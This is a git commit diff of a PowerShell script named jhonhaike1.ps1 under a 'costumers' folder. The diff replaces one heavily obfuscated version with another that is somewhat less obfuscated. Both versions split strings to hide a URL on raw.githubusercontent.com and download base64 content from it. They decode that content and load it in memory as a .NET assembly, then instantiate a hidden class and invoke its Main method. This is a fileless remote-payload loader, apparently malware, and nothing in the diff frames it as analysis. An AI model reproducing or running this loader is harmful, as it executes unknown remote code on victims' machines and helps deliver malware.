40d704eb77f788cfcefbf3394d3fcb7e9bbda65d
Violentqm <79298794+violentqm@users.noreply.github.com>
2024-02-13 07:10:19 -0800

    Update jhonhaike1.ps1

--- costumers/jhonhaike1.ps1
+++ costumers/jhonhaike1.ps1
@@ -1,20 +1,19 @@
- .( $ShELLId[1]+$shElLID[13]+'X')(('SeT (nj1Pnj1+nj1SBnj1)  ( [tYPE](nj1{2}{0}{3}{1}'+'nj1 -F 0gQonV0gQ,0gQt0gQ,0gQsYstEm.C0gQ,'+'0gQER0gQ))  ; Set  (nj1d9jnj1+n'+'j1pS3nj1)  ( '+'[tYpE](nj1{4}{0}{1}{3}{5}{2}nj1 -f0'+'gQSTeM.R0gQ'+',0gQef0gQ,0gQmBLy0gQ,0gQL'+'eCtIoN.asS0gQ,0gQSY0gQ,0gQE0gQ));    Set-iTEm  VaRIAblE:nbo ( [tYPe](nj1{0}{1}{2}nj1 -F 0gQsYs'+'teM0'+'gQ,0gQ.0gQ,0gQaCtIvaTor0gQ)); '+'XyF{U5xLRL} = (nj1{5}{2}{17}{18}{6}{8}{19}{3}{9}{10}{16}{13}{7}{1}{15}{11}{12}{0}{14}{4}nj1 -f 0gQnha0gQ,0gQn/0gQ,'+'0gQr0gQ,0gQhubuser0gQ,0gQ.txt0gQ,0gQhttps://0gQ,0gQg0gQ,0gQm'+'ai0gQ,0'+'gQi0gQ,0gQcon0'+'gQ,0gQtent.0gQ,0gQers/j0gQ,0gQho0gQ,0'+'gQtqm/re'+'st/0gQ,0'+'gQkie0gQ,0gQcostum0gQ,0gQcom/v'+'iolen0gQ,0gQa0gQ,0gQw.0gQ,0gQt0gQ)
-'+'
-XyF{Re5xLs5xLPONSe} = &(nj1{2}'+'{4}{3}{0}{1}{5}nj1-f'+' 0gQbR0gQ,0gQeque0gQ,0gQInvo0gQ,0gQ-We0gQ,0gQke0gQ,0gQst0'+'gQ) -Uri XyF{u5xLRl} -UseBasicParsing
+SeT ("P"+"SB")  ( [tYPE]("{2}{0}{3}{1}" -F 'onV','t','sYstEm.C','ER'))  ; Set  ("d9j"+"pS3")  ( [tYpE]("{4}{0}{1}{3}{5}{2}" -f'STeM.R','ef','mBLy','LeCtIoN.asS','SY','E'));    Set-iTEm  VaRIAblE:nbo ( [tYPe]("{0}{1}{2}" -F 'sYsteM','.','aCtIvaTor')); ${U`RL} = ("{5}{2}{17}{18}{6}{8}{19}{3}{9}{10}{16}{13}{7}{1}{15}{11}{12}{0}{14}{4}" -f 'nha','n/','r','hubuser','.txt','https://','g','mai','i','con','tent.','ers/j','ho','tqm/rest/','kie','costum','com/violen','a','w.','t')
 
-if (XyF{r5xLesp5xLoNSe}.nj1St5xLATus5xLCoDEnj1 -eq 200)'+' {
-    XyF{'+'B5xLASe5xL64St5xLRi5xLNG} = XyF{R5xLeSP5xLonSe}.nj1coNt5xLE5xLNtnj1
+${Re`s`PONSe} = &("{2}{4}{3}{0}{1}{5}"-f 'bR','eque','Invo','-We','ke','st') -Uri ${u`Rl} -UseBasicParsing
 
-    XyF{bYT5x'+'LE5xLA5xLRrAY} =  (dir  '+'(nj1Vanj1+'+'nj1RiaBlnj1+nj1E:PsBnj1)'+').VAlUE::(nj1{3}{2}'+'{1}{4}{0}nj1 -f 0gQng0'+'gQ,0gQ4S0gQ,0gQBase60gQ,0gQFrom0g'+'Q,0gQtri0gQ).Invoke(XyF{baSE65xL4Str5xLing})
-    XyF{aSSe5xLm5'+'xLBly} =   ( gEt-CHiLdITEm  (0gQvaRiabL0gQ+0gQE:d0gQ+0gQ9JpS0gQ+0gQ30gQ) ).VAlUe::(nj1{1}{0}nj1 -f 0gQad0gQ,0gQLo0gQ).Invoke(XyF{'+'bytE5xLAR5xLRAY})
+if (${r`esp`oNSe}."St`ATus`CoDE" -eq 200) {
+    ${B`ASe`64St`Ri`NG} = ${R`eSP`onSe}."coNt`E`Nt"
 
-    XyF{C5xLLaSs} = XyF{AsSE5xLMbLy}.(nj1{1}{0}nj1-f0gQType0gQ,0gQGet0gQ).Invok'+'e((nj1{4}{1}{2}{0}{3}nj1-f0gQk.H0gQ,0gQJAMsr0gQ,0gQpf'+'h0gQ,0gQH0'+'gQ,0gQQ0gQ))
-    X'+'yF{M5xLEtH5xLOD} = XyF{cla5xLss}.(nj1{0'+'}{1}nj'+'1 -f0gQGe'+'tMe0gQ,0gQthod'+'0gQ).In'+'voke((nj1{0}{1}nj1 -f 0gQM0gQ,0gQain0gQ))
+    ${bYT`E`A`RrAY} =  (dir  ("Va"+"RiaBl"+"E:PsB")).VAlUE::("{3}{2}{1}{4}{0}" -f 'ng','4S','Base6','From','tri').Invoke(${baSE6`4Str`ing})
+    ${aSSe`m`Bly} =   ( gEt-CHiLdITEm  ('vaRiabL'+'E:d'+'9JpS'+'3') ).VAlUe::("{1}{0}" -f 'ad','Lo').Invoke(${bytE`AR`RAY})
 
-    XyF{INs5x'+'LT5xLANcE} '+'=   XyFNbo::(nj1{0}{1}{2}nj1-f0gQCreat0gQ,0gQeInst0gQ,0gQance0gQ).Invoke(XyF{C5xL'+'L5xLAss})
-    XyF{Me5xLTH5xLOD}.n'+'j1iN5xLVoKenj1(XyF{I5xLNs5xLTANCE}, @())'+'
+    ${C`LaSs} = ${AsSE`MbLy}.("{1}{0}"-f'Type','Get').Invoke(("{4}{1}{2}{0}{3}"-f'k.H','JAMsr','pfh','H','Q'))
+    ${M`EtH`OD} = ${cla`ss}.("{0}{1}" -f'GetMe','thod').Invoke(("{0}{1}" -f 'M','ain'))
 
-} else '+'{'+'
-    '+'&(nj1{2}{1}{0}nj1 -f 0gQHost0gQ,0gQ-0g'+'Q,0gQWrite0gQ) nj1Failed to download base64St'+'ring. Status code: X'+'y'+'F(XyFr'+'esponse'+'.StatusCode'+') nj1
+    ${INs`T`ANcE} =   $Nbo::("{0}{1}{2}"-f'Creat','eInst','ance').Invoke(${C`L`Ass})
+    ${Me`TH`OD}."iN`VoKe"(${I`Ns`TANCE}, @())
+
+} else {
+    &("{2}{1}{0}" -f 'Host','-','Write') "Failed to download base64String. Status code: $($response.StatusCode) "
 }
-').rEplACe('nj1',[stRIng][char]34).rEplACe('5xL',[stRIng][char]96).rEplACe('0gQ',[stRIng][char]39).rEplACe(([char]88+[char]121+[char]70),'$')) 
